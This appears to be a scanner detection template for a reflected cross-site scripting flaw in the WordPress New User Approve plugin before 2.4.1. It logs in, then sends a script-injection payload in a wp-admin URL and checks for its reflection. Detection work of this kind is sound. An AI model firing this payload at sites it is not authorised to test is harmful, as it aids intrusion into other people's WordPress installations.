id: new-user-approve-xss
brief:
    title: WordPress New User Approve <2.4.1 - Cross-Site Scripting
    by: Akincibor
    level: medium
    about: WordPress New User Approve 2.4.1 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
    label:
        - wordpress
        - xss
        - authenticated
        - wp-plugin
        - wpscan
        - wp
        - vuln
    score: CVSS:5.4
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check
        Origin: '{{RootURL}}'
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      signs:
        - "on": word
          has:
            - ?a"><script>alert(1)</script>&new-user-approve-settings
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/index.php?a%22%3E%3Cscript%3Ealert(1)%3C/script%3E'
      signs:
        - "on": word
          has:
            - ?a"><script>alert(1)</script>&new-user-approve-settings
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
